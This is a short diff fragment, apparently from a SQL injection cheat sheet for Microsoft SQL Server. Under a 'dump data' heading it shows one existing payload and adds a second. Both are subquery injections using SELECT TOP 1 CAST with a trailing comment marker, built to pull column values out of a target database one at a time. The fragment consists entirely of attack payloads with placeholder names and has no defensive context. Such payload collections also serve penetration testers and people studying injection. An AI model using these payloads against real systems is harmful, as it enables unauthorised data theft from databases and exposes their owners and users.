@@ -3333,6 +3333,8 @@ user_name()
 
 ### dump data
 (SELECT TOP 1 CAST(column_here as varchar(4096) FROM database_here..table_name_here WHERE column_name NOT IN ('known_data1_here','known_data2_here')); --
+
+(SELECT TOP 1 CAST(column_here as varchar) FROM database_here..table_name_here WHERE column_name=1); --
 ```
 
 
